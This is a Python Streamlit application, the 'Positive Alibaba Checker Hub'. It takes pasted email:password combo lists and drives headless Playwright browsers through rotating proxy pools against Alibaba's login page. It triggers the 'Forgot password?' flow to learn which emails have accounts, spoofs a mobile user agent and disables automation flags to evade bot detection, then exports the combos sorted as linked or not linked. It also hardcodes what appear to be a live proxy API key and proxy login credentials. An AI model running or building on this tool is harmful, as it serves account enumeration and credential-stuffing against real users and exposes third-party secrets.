import streamlit as st
import asyncio
import os
import random
import uuid
import time
import requests
import sys
import subprocess
import json
import threading
import glob
import zipfile
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
import pandas as pd
from playwright.async_api import async_playwright
import nest_asyncio

# Apply nest_asyncio to allow nested event loops in Streamlit
nest_asyncio.apply()

# Ensure Playwright binaries are auto-installed in cloud environments
def ensure_playwright_browsers():
    for browser_type in ["chromium", "firefox"]:
        try:
            subprocess.run(
                [sys.executable, "-m", "playwright", "install", browser_type],
                check=True,
                capture_output=True,
                text=True
            )
        except Exception as e:
            print(f"Error auto-installing Playwright {browser_type}: {e}")

ensure_playwright_browsers()

# Page Configuration
st.set_page_config(
    page_title="Positive Alibaba Checker Hub",
    page_icon="📦",
    layout="wide",
    initial_sidebar_state="expanded"
)

st.title("📦 Positive Alibaba Checker Hub")
st.caption("Advanced automated Alibaba account existence checker with full proxy health management, scoring, pool selection, and real-time telemetry.")

# Initialize Session State
if "proxy_logs" not in st.session_state:
    st.session_state.proxy_logs = []
if "checker_logs" not in st.session_state:
    st.session_state.checker_logs = []
if "startup_entries" not in st.session_state:
    st.session_state.startup_entries = []
if "alibaba_results" not in st.session_state:
    st.session_state.alibaba_results = {"linked": [], "not_linked": [], "errors": []}
if "pool_mode" not in st.session_state:
    st.session_state.pool_mode = "all"
if "pool_locked" not in st.session_state:
    st.session_state.pool_locked = True
if "picked_countries" not in st.session_state:
    st.session_state.picked_countries = ["US"]
if "pool_pick" not in st.session_state:
    st.session_state.pool_pick = None

def log_startup(msg):
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = f"[{timestamp}] [INIT/HOOD] {msg}"
    if entry not in st.session_state.startup_entries:
        st.session_state.startup_entries.append(entry)

log_startup("Alibaba Checker Hub initialized with advanced proxy health manager.")

# Constants
LOGIN_URL = "https://login.alibaba.com/mini_login.htm?scene=h5&appName=icbu&appEntrance=icbu_h5&isMobile=true&lang=en_US"

def add_checker_log(msg: str):
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = f"[{timestamp}] {msg}"
    st.session_state.checker_logs.append(entry)

def add_proxy_log(msg: str):
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = f"[{timestamp}] {msg}"
    st.session_state.proxy_logs.append(entry)

# --- Automatic Streamlit Secrets-to-Env Bridge ---
def _secret_to_env(k, v):
    if v is None:
        return
    if isinstance(v, (list, tuple)):
        os.environ[str(k)] = "\n".join(str(x) for x in v if x is not None)
        return
    if isinstance(v, dict):
        return
    os.environ[str(k)] = str(v)

try:
    for k, v in st.secrets.items():
        _secret_to_env(k, v)
    log_startup("Successfully bridged Streamlit secrets to environment variables.")
except Exception as e:
    log_startup(f"WARNING: Failed to bridge secrets to environment: {e}")

# --- Proxy & Secrets Loaders ---
def get_secrets_webshare_keys():
    if "WEBSHARE_KEYS" in st.secrets:
        raw = st.secrets["WEBSHARE_KEYS"]
        return [k.strip() for k in raw.strip().splitlines() if k.strip()]
    return ["ty1wj93kaw0k1ab7vv05lqvga86zs6tu2ngqjkyo"]

def get_secrets_oxylabs_proxies():
    if "OXYLABS_BASE" in st.secrets:
        raw = st.secrets["OXYLABS_BASE"]
        return [p.strip() for p in raw.strip().splitlines() if p.strip()]
    return ["user-Positive_S79mq-country-US:Kingfrosh5252+@dc.oxylabs.io:8000"]

webshare_keys_env = get_secrets_webshare_keys()
oxylabs_proxies_env = get_secrets_oxylabs_proxies()

proxy_meta_file = "proxy_meta.json"
def load_proxy_meta():
    if os.path.exists(proxy_meta_file):
        try:
            with open(proxy_meta_file, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

proxy_meta = load_proxy_meta()
proxy_lock = threading.Lock()
file_write_lock = threading.Lock()

def save_proxy_meta():
    try:
        with file_write_lock:
            with proxy_lock:
                with open(proxy_meta_file, "w", encoding="utf-8") as f:
                    json.dump(proxy_meta, f, indent=2)
    except Exception as e:
        print(f"Failed to save proxy meta: {e}")

def load_proxies():
    proxy_file = "proxies.txt"
    if not os.path.exists(proxy_file) or os.path.getsize(proxy_file) == 0:
        default_seed = oxylabs_proxies_env[:]
        try:
            with file_write_lock:
                with open(proxy_file, "w", encoding="utf-8") as f:
                    f.write("\n".join(default_seed) + "\n")
        except Exception:
            pass
    try:
        with open(proxy_file, encoding="utf-8", errors="ignore") as f:
            raw_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        return raw_list if raw_list else oxylabs_proxies_env
    except Exception:
        return oxylabs_proxies_env

def parse_proxy(proxy_str):
    proxy_str = (proxy_str or "").strip()
    if not proxy_str:
        return None
    if "@" in proxy_str:
        return f"http://{proxy_str}"
    return None

def compute_real_score(success_count, fail_count, initial_latency_score=80):
    try:
        total = success_count + fail_count
        if total == 0:
            return initial_latency_score
        smoothed_success = success_count + 2
        smoothed_fail = fail_count + 1
        smoothed_total = smoothed_success + smoothed_fail
        success_rate = (smoothed_success / smoothed_total) * 100
        score = int(success_rate - (fail_count * 5))
        return max(0, min(100, score))
    except Exception:
        return initial_latency_score

def test_proxy(proxy_str, timeout_sec=3):
    try:
        proxy = parse_proxy(proxy_str)
        if not proxy:
            return False, "Invalid proxy format", "Unknown", 0
        start_t = time.time()
        r = requests.get("https://api.ipify.org?format=json", proxies={"http": proxy, "https": proxy}, timeout=timeout_sec)
        latency = int((time.time() - start_t) * 1000)
        if r.status_code == 200:
            initial_score = max(0, min(100, 100 - int(latency / 15)))
            country, city = get_geo(proxy_str)
            with proxy_lock:
                if proxy_str not in proxy_meta:
                    proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": country, "region": city, "latency_ms": latency}
                m = proxy_meta[proxy_str]
                m["success"] = m.get("success", 0) + 1
                m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0), initial_score)
                m["country"] = country
                m["region"] = city
                m["latency_ms"] = latency
            save_proxy_meta()
            return True, f"OK ({latency}ms)", country, proxy_meta[proxy_str]["score"]
        return False, f"HTTP Status {r.status_code}", "Unknown", 0
    except requests.exceptions.Timeout:
        record_proxy_failure(proxy_str)
        return False, "Connection Timeout", "Unknown", 0
    except Exception as e:
        record_proxy_failure(proxy_str)
        return False, str(e)[:30], "Unknown", 0

def record_proxy_failure(proxy_str):
    with proxy_lock:
        if proxy_str not in proxy_meta:
            proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": "Unknown", "region": "Unknown", "latency_ms": 0}
        m = proxy_meta[proxy_str]
        m["fails"] = m.get("fails", 0) + 1
        m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0))
    save_proxy_meta()

def get_geo(proxy_str):
    proxy = parse_proxy(proxy_str)
    if not proxy:
        return "-", "-"
    try:
        r = requests.get("http://ip-api.com/json/", proxies={"http": proxy, "https": proxy}, timeout=5)
        data = r.json()
        return data.get("country", "-"), data.get("city", "-")
    except Exception:
        return "-", "-"

def load_webshare(api_keys):
    info, out = {}, []
    for api_key in api_keys:
        if not api_key.strip():
            continue
        try:
            headers = {"Authorization": f"Token {api_key.strip()}"}
            page = 1
            while page <= 10:
                url = f"https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page={page}&page_size=100"
                r = requests.get(url, headers=headers, timeout=15)
                if r.status_code != 200:
                    break
                data = r.json()
                items = data.get("results", [])
                if not items:
                    break
                for it in items:
                    try:
                        line = f"{it['username']}:{it['password']}@{it['proxy_address']}:{it['port']}"
                        out.append(line)
                        info[line] = (str(it.get("country_code") or "-"), str(it.get("city_name") or "-"))
                    except Exception:
                        continue
                if not data.get("next"):
                    break
                page += 1
        except Exception as e:
            add_proxy_log(f"Error fetching Webshare API key: {str(e)[:50]}")
            continue
    return list(dict.fromkeys(out)), info

def get_available_countries_with_scores():
    try:
        raw = load_proxies()
        country_scores = defaultdict(list)
        for p in raw:
            meta = proxy_meta.get(p, {})
            c = meta.get("country", "Unknown").upper()
            score = meta.get("score", 50)
            country_scores[c].append(score)
        avg_country_scores = [(c, sum(s)/len(s)) for c, s in country_scores.items() if c != "UNKNOWN"]
        avg_country_scores.sort(key=lambda x: x[1], reverse=True)
        return [item[0] for item in avg_country_scores] + ["US"]
    except Exception:
        return ["US", "GB", "DE"]

def get_filtered_active_proxies():
    raw = load_proxies()
    filtered = []
    min_score = st.session_state.get("min_proxy_score", 40)
    mode = st.session_state.get("pool_mode", "all")
    chosen = st.session_state.get("picked_countries", ["US"])
    
    for p in raw:
        meta = proxy_meta.get(p, {})
        score = meta.get("score", 50)
        country = meta.get("country", "Unknown").upper()
        if score < min_score:
            continue
        if mode == "all":
            filtered.append(p)
        elif mode == "us_only":
            if "US" in country or "UNITED STATES" in country or "-country-US" in p:
                filtered.append(p)
        elif mode in ("country", "mix"):
            if any(cc in country or cc in p.upper() for cc in chosen):
                filtered.append(p)
        else:
            filtered.append(p)
    return filtered if filtered else raw

# --- Sidebar Configuration Hub ---
st.sidebar.header("⚙️ Configuration Hub")

st.sidebar.markdown("### 🌐 Proxy Management & Health")
all_proxies_loaded = load_proxies()
filtered_proxy_pool = get_filtered_active_proxies()
st.sidebar.info(f"Loaded Proxies: {len(all_proxies_loaded)} | Filtered Pool: {len(filtered_proxy_pool)}")

min_proxy_score = st.sidebar.slider("Min Proxy Score", 0, 100, 40, key="min_proxy_score")
proxy_timeout = st.sidebar.slider("Proxy Pre-Check Timeout (Sec)", 1, 10, 3, key="proxy_timeout")

pool_mode = st.session_state.pool_mode
if st.session_state.pool_locked:
    st.sidebar.success(f"Pool set: {pool_mode}")
    if pool_mode in ("country", "mix"):
        st.sidebar.caption("Picked: " + ", ".join(st.session_state.picked_countries))
    if st.sidebar.button("Change pool"):
        st.session_state.pool_locked = False
        st.session_state.pool_pick = None
        st.rerun()
else:
    st.sidebar.caption("Tap pool mode:")
    col_p1, col_p2 = st.sidebar.columns(2)
    with col_p1:
        if st.sidebar.button("all", key="pool_btn_all"):
            st.session_state.pool_mode = "all"
            st.session_state.pool_locked = True
            st.session_state.pool_pick = None
            st.rerun()
        if st.sidebar.button("country", key="pool_btn_country"):
            st.session_state.pool_pick = "country"
            st.rerun()
    with col_p2:
        if st.sidebar.button("us_only", key="pool_btn_us"):
            st.session_state.pool_mode = "us_only"
            st.session_state.pool_locked = True
            st.session_state.pool_pick = None
            st.rerun()
        if st.sidebar.button("mix", key="pool_btn_mix"):
            st.session_state.pool_pick = "mix"
            st.rerun()
            
    choice = st.session_state.pool_pick
    if choice in ("country", "mix"):
        available_countries = get_available_countries_with_scores()
        with st.sidebar.form("pool_pick_form"):
            picked = []
            for c in available_countries:
                if st.checkbox(c, value=c in st.session_state.picked_countries, key=f"poolchk_{choice}_{c}"):
                    picked.append(c)
            if st.form_submit_button("Done"):
                if picked:
                    st.session_state.pool_mode = choice
                    st.session_state.picked_countries = picked
                    st.session_state.pool_locked = True
                    st.session_state.pool_pick = None
                    st.rerun()

with st.sidebar.expander("➕ Add Custom Proxies", expanded=False):
    custom_proxy_text = st.text_area("Paste proxies (user:pass@ip:port)", height=80)
    if st.button("Save Custom Proxies"):
        if custom_proxy_text.strip():
            new_p = [l.strip() for l in custom_proxy_text.splitlines() if l.strip()]
            existing = load_proxies()
            combined = list(dict.fromkeys(existing + new_p))
            with file_write_lock:
                with open("proxies.txt", "w", encoding="utf-8") as f:
                    f.write("\n".join(combined) + "\n")
            st.success(f"Added {len(new_p)} custom proxies!")
            st.rerun()

if st.sidebar.button("📥 Fetch & Test All Proxies"):
    st.session_state.proxy_logs = []
    with st.spinner("Fetching Webshare proxies & testing pool health..."):
        ws_list, api_info = load_webshare(webshare_keys_env)
        all_raw = list(dict.fromkeys(oxylabs_proxies_env + ws_list))
        live = []
        for idx, p in enumerate(all_raw, 1):
            short = p.split("@")[-1] if "@" in p else p
            is_alive, msg, country, score = test_proxy(p, timeout_sec=proxy_timeout)
            if is_alive:
                live.append(p)
                add_proxy_log(f"[{idx}/{len(all_raw)}] ✅ Alive → {short} | Country: {country} | Score: {score} | {msg}")
            else:
                add_proxy_log(f"[{idx}/{len(all_raw)}] ❌ Dead → {short} | Reason: {msg}")
        with file_write_lock:
            with open("proxies.txt", "w", encoding="utf-8") as f:
                f.write("\n".join(live))
        st.success(f"Proxy test complete! Saved {len(live)} live proxies.")

with st.sidebar.expander("📊 Proxy Health & Geo Dashboard", expanded=False):
    if proxy_meta:
        p_list = []
        for p_str, meta in proxy_meta.items():
            info = parse_proxy(p_str)
            p_list.append({
                "Proxy": p_str.split("@")[-1],
                "Country": meta.get("country", "-"),
                "Score": meta.get("score", 50),
                "Latency": f"{meta.get('latency_ms', 0)}ms",
                "Success": meta.get("success", 0),
                "Fails": meta.get("fails", 0)
            })
        st.dataframe(pd.DataFrame(p_list), width='stretch')
        if st.button("🧹 Clean Dead Proxies"):
            with proxy_lock:
                for k, m in list(proxy_meta.items()):
                    if m.get("score", 50) < 5 or m.get("fails", 0) >= 10:
                        proxy_meta.pop(k, None)
            save_proxy_meta()
            st.success("Cleaned dead proxies!")
            st.rerun()

custom_key_input = st.sidebar.text_area("Webshare API Keys Override", value="\n".join(webshare_keys_env), height=70)
max_workers = st.sidebar.slider("Worker Threads", 1, 10, 3)

st.sidebar.markdown("---")
st.sidebar.header("📋 Accounts Input")
accounts_input = st.sidebar.text_area(
    "Paste accounts (email:password)",
    value="example1@domain.com:password123\nexample2@domain.com:password456",
    height=120
)

# --- 🖥️ Startup & Under-The-Hood Display Panel ---
st.markdown("---")
st.markdown("### 🖥️ Startup & Under-The-Hood Display Panel")
startup_expander = st.expander("🔍 View All Startup Entries & What Is Going On In The Hood", expanded=True)
with startup_expander:
    st.markdown("Below is the real-time activity ledger recording system boot, config injection, proxy health checks, and engine state transitions:")
    startup_log_display = st.empty()
    startup_log_display.code("\n".join(st.session_state.startup_entries), language="text")
    col_st1, col_st2 = st.columns(2)
    with col_st1:
        if st.button("🔄 Refresh Startup Screen"):
            st.rerun()
    with col_st2:
        if st.button("🧹 Clear Startup Logs"):
            st.session_state.startup_entries = []
            log_startup("Startup logs cleared by user.")
            st.rerun()

# --- Main Dashboard Tabs ---
tab1, tab2, tab3 = st.tabs(["🌐 Proxy Manager", "🚀 Alibaba Checker", "📁 Results & Export"])

with tab1:
    st.subheader("Proxy Management, Health & Geo-Telemetry Tester")
    if st.session_state.proxy_logs:
        st.code("\n".join(st.session_state.proxy_logs), language="text")
    else:
        st.info("Click 'Fetch & Test All Proxies' in the sidebar to run live proxy diagnostics.")

with tab2:
    st.subheader("Alibaba Existence & Status Checker Engine")
    accounts = [l.strip() for l in accounts_input.strip().splitlines() if l.strip() and ":" in l]
    st.info(f"Loaded **{len(accounts)}** valid account combos ready for checking.")

    if st.button("🚀 Start Alibaba Checker", type="primary"):
        if not accounts:
            st.warning("Please provide accounts in the sidebar first.")
        else:
            st.session_state.checker_logs = []
            add_checker_log(f"Initializing Alibaba Checker engine with {len(accounts)} accounts across {max_workers} worker threads.")

            async def run_checker():
                proxy_file = "proxies.txt"
                alive_proxies = []
                if os.path.exists(proxy_file):
                    with open(proxy_file, encoding="utf-8") as f:
                        alive_proxies = [l.strip() for l in f if l.strip()]
                if not alive_proxies:
                    alive_proxies = oxylabs_proxies_env

                proxy_lock_async = asyncio.Lock()
                result_lock = asyncio.Lock()
                linked_accs, not_linked_accs, error_accs = [], [], []

                def make_oxy(base_proxy):
                    if "@" in base_proxy:
                        user_pass, host = base_proxy.split("@", 1)
                        if ":" in user_pass:
                            user, pwd = user_pass.split(":", 1)
                            return f"{user}-sessid-{uuid.uuid4().hex[:12]}:{pwd}@{host}"
                    return base_proxy

                async def get_proxy():
                    async with proxy_lock_async:
                        if not alive_proxies:
                            return None
                        p = alive_proxies.pop(0)
                        alive_proxies.append(p)
                        if "oxylabs.io" in p:
                            return make_oxy(p)
                        return p

                def classify(url, text):
                    url, text = (url or "").lower(), (text or "").lower()
                    if ("verify_mode.htm" in url or "token_enter_iv.htm" in url or "iv_token=" in url or "get code" in text):
                        return "linked", "Verification page reached"
                    if "account does not exist" in text or "please enter a valid email" in text:
                        return "not_linked", "Account does not exist text detected"
                    if "captcha" in text or "blocked" in text or "security" in text:
                        return "error", "Captcha or Security block detected"
                    return None, None

                async def check_account(worker_id, page, email):
                    try:
                        add_checker_log(f"[Worker-{worker_id}] Navigating to Alibaba Login Portal for: {email}")
                        await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=35000)
                        await asyncio.sleep(0.8)
                        
                        btn = page.locator('text="Continue with email"')
                        if await btn.count() > 0:
                            add_checker_log(f"[Worker-{worker_id}] Clicking 'Continue with email' button for {email}")
                            await btn.first.click(timeout=5000)
                        await asyncio.sleep(0.8)
                        
                        inp = page.locator('input[type="email"], input[type="text"]')
                        if await inp.count() > 0:
                            add_checker_log(f"[Worker-{worker_id}] Entering email address: {email}")
                            await inp.first.fill(email, timeout=5000)
                        
                        fp = page.locator('text="Forgot password?"')
                        if await fp.count() > 0:
                            add_checker_log(f"[Worker-{worker_id}] Triggering account lookup via 'Forgot password?'")
                            await fp.first.click(timeout=5000)
                        await asyncio.sleep(1.0)
                        
                        end_time = time.time() + 7.0
                        while time.time() < end_time:
                            current_url = page.url
                            body_text = await page.inner_text("body")
                            status, detail = classify(current_url, body_text)
                            if status:
                                add_checker_log(f"[Worker-{worker_id}] Classified [{email}] → Status: {status.upper()} ({detail}) | URL: {current_url[:50]}")
                                return status, detail
                            await asyncio.sleep(0.3)
                        
                        add_checker_log(f"[Worker-{worker_id}] Telemetry timeout for [{email}] on URL: {page.url[:60]}")
                        return "error", "Telemetry Timeout / Unknown State"
                    except Exception as e:
                        err_str = str(e)[:90]
                        add_checker_log(f"[Worker-{worker_id}] Exception evaluating [{email}]: {err_str}")
                        return "error", err_str

                async def worker(worker_id, browser, queue):
                    raw_proxy = await get_proxy()
                    parsed = f"http://{raw_proxy}" if raw_proxy and "@" in raw_proxy else None
                    proxy_display = raw_proxy.split('@')[-1] if raw_proxy else 'None'
                    add_checker_log(f"[Worker-{worker_id}] Initialized with proxy endpoint: {proxy_display}")
                    
                    context = await browser.new_context(
                        viewport={"width": 390, "height": 844},
                        user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
                        is_mobile=True, proxy={"server": parsed} if parsed else None
                    )
                    page = await context.new_page()

                    while not queue.empty():
                        idx, line = await queue.get()
                        email = line.split(":", 1)[0].strip()
                        status, detail = await check_account(worker_id, page, email)
                        
                        async with result_lock:
                            if status == "linked":
                                linked_accs.append(line)
                            elif status == "not_linked":
                                not_linked_accs.append(line)
                            else:
                                error_accs.append(f"{line} # {detail}")
                        queue.task_done()
                    await context.close()

                async with async_playwright() as p:
                    browser = None
                    # Try launching Chromium first; fallback to Firefox if Chromium libraries are missing
                    try:
                        add_checker_log("Launching headless Playwright Chromium instance...")
                        browser = await p.chromium.launch(
                            headless=True,
                            args=[
                                "--no-sandbox",
                                "--disable-setuid-sandbox",
                                "--disable-dev-shm-usage",
                                "--disable-gpu",
                                "--disable-software-rasterizer",
                                "--disable-blink-features=AutomationControlled"
                            ]
                        )
                    except Exception as chrom_err:
                        add_checker_log(f"Chromium launch failed ({chrom_err}). Falling back to Firefox...")
                        try:
                            browser = await p.firefox.launch(headless=True)
                        except Exception as ff_err:
                            add_checker_log(f"Firefox fallback also failed: {ff_err}")
                            raise ff_err

                    queue = asyncio.Queue()
                    for idx, line in enumerate(accounts, 1):
                        await queue.put((idx, line))

                    workers = [asyncio.create_task(worker(i + 1, browser, queue)) for _ in range(max_workers)]
                    await queue.join()
                    await asyncio.gather(*workers)
                    await browser.close()
                    add_checker_log("Playwright browser closed successfully. Checking run finished.")

                return {"linked": linked_accs, "not_linked": not_linked_accs, "errors": error_accs}

            with st.spinner("Running asynchronous Alibaba account verification & browser telemetry..."):
                try:
                    loop = asyncio.get_event_loop()
                    results = loop.run_until_complete(run_checker())
                except RuntimeError:
                    results = asyncio.run(run_checker())
                    
                st.session_state.alibaba_results = results
                st.success("Checker execution complete!")

    # Live session metrics
    res = st.session_state.alibaba_results
    m1, m2, m3 = st.columns(3)
    m1.metric("✅ Linked Accounts", len(res["linked"]))
    m2.metric("❌ Not Linked", len(res["not_linked"]))
    m3.metric("⚠️ Errors", len(res["errors"]))

    # Detailed Real-Time Diagnostic Screen
    st.markdown("---")
    with st.expander("🔍 Real-time Checker Diagnostic Telemetry Logs", expanded=True):
        if st.session_state.checker_logs:
            st.code("\n".join(st.session_state.checker_logs), language="text")
        else:
            st.caption("Diagnostic logs will appear here during execution.")

with tab3:
    st.subheader("Export Results & Filtered Lists")
    res = st.session_state.alibaba_results
    
    if res["linked"]:
        st.markdown("### Linked Accounts")
        st.code("\n".join(res["linked"]), language="text")
        st.download_button("Download Linked TXT", "\n".join(res["linked"]), file_name="linked_accounts.txt", mime="text/plain")

    if res["not_linked"]:
        st.markdown("### Not Linked Accounts")
        st.code("\n".join(res["not_linked"]), language="text")
        st.download_button("Download Not Linked TXT", "\n".join(res["not_linked"]), file_name="not_linked_accounts.txt", mime="text/plain")

    if res["errors"]:
        st.markdown("### Errors & Failures")
        st.code("\n".join(res["errors"]), language="text")
        st.download_button("Download Errors TXT", "\n".join(res["errors"]), file_name="error_accounts.txt", mime="text/plain")
